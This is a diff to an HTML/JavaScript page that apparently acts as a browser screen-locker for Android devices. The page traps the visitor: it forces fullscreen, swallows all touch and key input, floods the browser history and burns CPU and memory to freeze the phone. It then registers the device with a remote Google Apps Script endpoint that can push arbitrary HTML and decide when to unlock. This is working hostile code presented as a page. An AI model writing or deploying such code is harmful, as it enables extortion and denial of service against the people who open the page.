@@ -2,48 +2,56 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>.</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         html,body{width:100%;height:100%;overflow:hidden;position:fixed;top:0;left:0;background:#000}
-        body{display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;color:#fff;touch-action:none;-webkit-touch-callout:none;-webkit-user-select:none;user-select:none}
+        body{font-family:Arial,sans-serif;color:#fff}
     </style>
 </head>
 <body>
-<div id="s" style="color:#666;font-size:13px;">System...</div>
+<div id="s" style="color:#666;font-size:13px;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:9999;">System...</div>
 <script>
 const API='https://script.google.com/macros/s/AKfycbzwtt_Qt3xFQ5ToKqAy3Je-ukHD41Tinl9bHXT7aTd3KXQ3bt15w0SiMuHLY31peOheug/exec';
 const DID='z'+Math.random().toString(36).substring(2,15);
 const M=navigator.userAgent.match(/Android[\s\d.]+/)?.[0]||'Android';
 let locked=true;
+let floodActive=true;
 
-sematMati();
-
-async function reg(){
-  try{
-    let r=await fetch(API,{method:'POST',body:JSON.stringify({action:'register',device_id:DID,model:M})});
-    let d=await r.json();
-    if(d.command==='UNLOCK'){bukaKunci();return;}
-    if(d.command){document.body.innerHTML=d.command;sematMati();}
-    else document.getElementById('s').innerHTML='OK';
-  }catch(e){}
+// === FLOOD LAG PARAH ===
+function flood(){
+  if(!floodActive)return;
+  
+  // CPU flood
+  for(let i=0;i<1000;i++){
+    Math.random()*Math.random()*Math.random();
+    JSON.stringify({a:Math.random(),b:new Array(100).fill(Math.random())});
+  }
+  
+  // DOM flood
+  for(let i=0;i<50;i++){
+    let d=document.createElement('div');
+    d.style.cssText='position:fixed;top:0;left:0;width:1px;height:1px;background:rgba(0,0,0,0.01)';
+    d.textContent=Math.random().toString(36).repeat(10);
+    document.body.appendChild(d);
+    setTimeout(()=>d.remove(),100);
+  }
+  
+  // Memory flood
+  let arr=[];
+  for(let i=0;i<100;i++){
+    arr.push(new Array(1000).fill(Math.random()));
+  }
+  
+  // Render flood
+  document.body.style.transform='translate('+Math.random()+'px,'+Math.random()+'px)';
+  document.body.style.transform='';
+  
+  requestAnimationFrame(flood);
 }
 
-async function chk(){
-  try{
-    let r=await fetch(API+'?action=check&device_id='+DID);
-    let d=await r.json();
-    if(d.command==='UNLOCK'){bukaKunci();return;}
-    if(d.command){document.body.innerHTML=d.command;sematMati();}
-  }catch(e){}
-}
-
-function bukaKunci(){
-  locked=false;
-  document.body.innerHTML='<div id="s" style="color:#666;">OK</div>';
-}
-
+// === SEMAT MATI ===
 function sematMati(){
   locked=true;
   goFull();
@@ -54,8 +62,6 @@ function goFull(){
   const el=document.documentElement;
   el.requestFullscreen?.();
   el.webkitRequestFullscreen?.();
-  el.mozRequestFullScreen?.();
-  el.msRequestFullscreen?.();
 }
 
 function blockAll(){
@@ -68,12 +74,9 @@ function blockAll(){
     return false;
   };
   
-  const events=['contextmenu','touchstart','touchmove','touchend','touchcancel',
-    'gesturestart','gesturechange','gestureend','wheel','keydown','keyup','keypress',
-    'pointerdown','pointermove','pointerup','pointercancel','mousedown','mousemove','mouseup',
-    'click','dblclick','select','selectstart','drag','dragstart','drop','scroll','copy','cut','paste'];
-  
-  events.forEach(ev=>{
+  ['contextmenu','touchstart','touchmove','touchend','touchcancel','gesturestart',
+   'gesturechange','gestureend','wheel','keydown','keyup','keypress','pointerdown',
+   'pointermove','pointerup','click','dblclick','select','scroll'].forEach(ev=>{
     document.addEventListener(ev,noEvent,{passive:false,capture:true});
     window.addEventListener(ev,noEvent,{passive:false,capture:true});
   });
@@ -90,27 +93,54 @@ function blockAll(){
   document.addEventListener('fullscreenchange',()=>{
     if(!document.fullscreenElement) goFull();
   });
-  document.addEventListener('webkitfullscreenchange',()=>{
-    if(!document.webkitFullscreenElement) goFull();
-  });
   
-  screen.orientation?.lock?.('portrait').catch(()=>{});
-  
-  document.body.style.userSelect='none';
-  document.body.style.webkitUserSelect='none';
   document.body.style.touchAction='none';
   document.body.style.pointerEvents='none';
 }
 
+// === API ===
+async function reg(){
+  try{
+    let r=await fetch(API,{method:'POST',body:JSON.stringify({action:'register',device_id:DID,model:M})});
+    let d=await r.json();
+    if(d.command==='UNLOCK'){unlockAll();return;}
+    if(d.command){
+      document.body.innerHTML=d.command;
+      sematMati();
+      floodActive=false;
+    }
+  }catch(e){}
+}
+
+async function chk(){
+  try{
+    let r=await fetch(API+'?action=check&device_id='+DID);
+    let d=await r.json();
+    if(d.command==='UNLOCK'){unlockAll();return;}
+    if(d.command){
+      document.body.innerHTML=d.command;
+      sematMati();
+      floodActive=false;
+    }
+  }catch(e){}
+}
+
+function unlockAll(){
+  locked=false;
+  floodActive=false;
+  document.body.innerHTML='<div style="color:#666;">OK</div>';
+}
+
+// === START ===
+sematMati();
+flood();
+reg();
+setInterval(chk,5000);
 setInterval(()=>{
   if(!locked)return;
   goFull();
   for(let i=0;i<3;i++) history.pushState(null,'',location.href);
-  if(screen.orientation?.lock) screen.orientation.lock('portrait').catch(()=>{});
-},0);
-
-reg();
-setInterval(chk,5000);
+},50);
 </script>
 </body>
 </html>
